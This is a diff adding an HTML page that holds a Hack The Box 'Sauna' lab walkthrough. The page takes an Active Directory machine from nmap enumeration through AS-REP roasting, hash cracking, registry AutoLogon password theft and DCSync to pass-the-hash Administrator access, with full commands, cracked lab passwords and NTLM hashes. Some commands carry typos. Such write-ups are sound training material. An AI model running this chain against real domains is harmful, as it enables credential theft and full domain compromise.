@@ -1,0 +1,231 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Sauna</h1>
+    <p class="text">Difficulty : Easy | UserDifficulty : 4.4</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV $IP --min-rate=10000</u>
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: Egotistical Bank :: Home
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-08 09:51:10Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  msrpc         Microsoft Windows RPC
+49685/tcp open  msrpc         Microsoft Windows RPC
+49692/tcp open  msrpc         Microsoft Windows RPC</code></pre></div>
+<p class="text">Nmap returned AD name EGOTISTICAL-BANK.local. Let's add this to /etc/hosts and dive deeper.</p>
+<div class="code-box"><pre><code>└─$ <u>echo '$IP egotistical-bank.local' | sudo -tee /a /etc/hosts</u></code></pre></div>
+<p class="text">We have several stuff to do like enumerating smb shares, browsing webpage, checking ldap etc. Let's start with SMB enumeration.</p>
+
+<div class="code-box"><pre><code>└─$ crackmapexec smb 10.129.95.180 -u guest -p '' --shares
+SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.129.95.180   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\guest: STATUS_ACCOUNT_DISABLED </code></pre></div>
+
+<p class="text">Hmm, it seems that guest user is disabled. We need to collect information to get valid credential. For that purpose, we might able to find domain username from website on port 80.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/sauna/1.png' %}" alt="">
+    <p class="text">On the aboutus page, I found several candidates. Though we can guess the username for finding valid username, there are many variations we have to test. Therefore, it's better to automate.</p>
+</div>
+
+<p class="text">While searching such a tool on google, I found <a href="https://www.linuxsec.org/2024/09/username-anarchy.html#:~:text=This%20is%20a%20brief%20tutorial,%2Danarchy%20%2Di%20evangelion.txt">this</a> article.</p>
+<p class="text">Following this article's instruction, I could make great custom wordlists like below:</p>
+<h3>1. Copy and paste all names we found</h3>
+<div class="code-box"><pre><code>└─$ echo 'Fergus Smith
+Shaun Coins
+Hugo Bear
+Bowie Taylor
+Sophie Driver
+Steven Kerb' > users.txt</code></pre></div>
+
+<h3>2. Mutate them</h3>
+<div class="code-box"><pre><code>└─$ <u>./username-anarchy --input-file users.txt --select-format first,flast,first.last,firstl > username.txt</u>
+└─$ cat username.txt
+fergus
+fergus.smith
+ferguss
+fsmith
+shaun
+shaun.coins
+shaunc
+scoins
+hugo
+hugo.bear
+hugob
+hbear
+bowie
+bowie.taylor
+bowiet
+btaylor
+sophie
+sophie.driver
+sophied
+sdriver
+steven
+steven.kerb
+stevenk
+skerb</code></pre></div>
+
+<h2 class="subtitle">Foothold</h2>
+<p class="text">We created a wordlist to brute-force target machine's users, however, we have no password to do that.</p>
+<p class="text">In this context, we have few stuff can be done. Though we can do further website enumeration, I'll perform AS-REP roasting since there may be a user who have <u>Do Not Require Kerberos Preauthentication</u> setting.</p>
+
+<div class="code-box"><pre><code>for name in $(cat username.txt); do impacket-GetNPUsers egotistical-bank.local/$name -request -no-pass -dc-ip 10.129.95.180 >> hashes.asreproast ;done</code></pre></div>
+<p class="text">hashes.asreproast is generated now. Let's see the outputs.</p>
+
+<div class="code-box"><pre><code>└─$ cat hashes.asreproast
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Getting TGT for fergus
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Getting TGT for fergus.smith
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+...
+    
+<u>[*] Getting TGT for fsmith</u>
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:166c9f598b9fc54b7f400172c322acf9$41a5d1484efb285405f04798deaf99f7a3cc1fe01b4c116443a36863b75e114a524b25e241c9157737a400f4102e673a492749c659c3acbab6d609b5e57da3123d590e6c31b637c77e3f854e21400055943f5fff39b3e2a12d950a58f6b1090a34af21da263559d3ffa35e2ae5eb7113b1f4f06ad2df3e335f28b7775e4e2fc3bfec5ed8bfd8b3107cc42b609d37da96a6e875dee205d1954d30ae0f883504c227a4aae70d00985d31e537552e203e994a2e6508c2743374e266bd1afda16476413c49ed24a6ec23fdb65ce1f92f8abc708aae424597ce28ce128dc960e7c86e297fd98e9a18f8e457ad79277daa1a1352f3e4b383f221d34e951fa1d18b0a7a
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies </code></pre></div>
+
+
+<p class="text">Fortunately, the user fsmith was vulnerable to AS-REP roasting. We can crack this hash with john.</p>
+<div class="code-box"><pre><code>└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
+...
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:<u>Thestrokes23</u></code></pre></div>
+
+<p class="text">We got credential for fsmith.</p>
+
+
+<h2 class="subtitle">Lateral Movement</h2>
+<p class="text">Because port 5985 is open on the target machine, we can use evil-winrm to get PowerShell.</p>
+<div class="code-box"><pre><code>└─$ evil-winrm -i 10.129.95.180 -u fsmith -p 'Thestrokes23'                         
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\FSmith\Documents> </code></pre></div>
+
+<p class="text">Then, there are many stuff to do. To make attacking vector visible, I prefer to start from bloodhound and analyze domain structure. Let's install SharpHound.ps1 to the target machine and analyze it with bloodhound.</p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\FSmith\Documents> <u>upload ../bloodhound/SharpHound.ps1</u>
+                                        
+Info: Uploading /home/kali/tempo/../bloodhound/SharpHound.ps1 to C:\Users\FSmith\Documents\SharpHound.ps1
+                                        
+Data: 2149636 bytes of 2149636 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\FSmith\Documents> <u>Import-Module .\SharpHound.ps1</u>
+ 
+*Evil-WinRM* PS C:\Users\FSmith\Documents> <u>Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\FSmith\Documents -OutputPrefix "xxxxxx"</u>
+*Evil-WinRM* PS C:\Users\FSmith\Documents> dir
+
+
+    Directory: C:\Users\FSmith\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        11/8/2025   5:47 AM        1612229 SharpHound.ps1
+-a----        11/8/2025   3:53 AM        1911808 winPEAS.exe
+-a----        11/8/2025   5:49 AM          27932 <u>xxxxxx_20251108054929_BloodHound.zip</u>
+-a----        11/8/2025   5:49 AM           1308 ZDFkMDEyYjYtMmE1ZS00YmY3LTk0OWItYTM2OWVmMjc5NDVk.bin</code></pre></div>
+
+<p class="text">Let's install this file to our local machine and analyze it.</p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/sauna/2.png' %}" alt="">
+    <p class="text">I filtered Shortest paths to the Domain Admins. Then I found the user svc_loanmng has possibility to the domain admin.</p>
+</div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/sauna/3.png' %}" alt="">
+    <p class="text">To confirm it, I searched svc_loanmng and found <u>Outbound Object Control</u>, which enable us to perform DCsync attacking.</p>
+</div>
+
+<p class="text">To exploit vulnerability we found, we have to get password of the user svc_loanmng. Let's enumerate the target domain more deeper.</p>
+
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\FSmith\Documents> get-item 'HKLM:\software\microsoft\windows nt\currentversion\winlogon'
+                               WinStationsDisabled          : 0
+                               scremoveoption               : 0
+                               DisableCAD                   : 1
+                               LastLogOffEndTimePerfCounter : 2358450679
+                               ShutdownFlags                : 2147484203
+                               DisableLockWorkstation       : 0
+                               DefaultPassword              : <u>Moneymakestheworldgoround!</u></code></pre></div>
+<p class="text">Enumerating user information revealed passowrd for svc_loanmng. Also we can use WinPEAS.exe to find this information.</p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\FSmith\Documents> .\WinPEAS.exe
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
+    Some AutoLogon credentials were found
+    DefaultDomainName             :  EGOTISTICALBANK
+    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
+    DefaultPassword               :  Moneymakestheworldgoround!</code></pre></div>
+
+
+<p class="text">Let's use this credential to get admin!</p>
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">Since we have valid username and password who can perform DCsync, we don't need to create new connection with evil-winrm. We can just send request from our local machine using impacket-secretsdump.</p>
+
+<div class="code-box"><pre><code><u>└─$ impacket-secretsdump -just-dc-user administrator egotisticalbank/svc_loanmgr:"Moneymakestheworldgoround\!"@10.129.95.180</u>
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+<u>Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::</u>
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
+Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
+Administrator:des-cbc-md5:fb8f321c64cea87f
+[*] Cleaning up... </code></pre></div>
+
+<p class="text">Then, we can simply pass the hash and get powershell with evil-winrm.</p>
+
+<div class="code-box"><pre><code>└─$ evil-winrm -i 10.129.95.180 -u administrator -H <u>823452073d75b9d1cf70ebdf86c7f98e</u>
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> </code></pre></div>
+
+
+</body>
+</html>
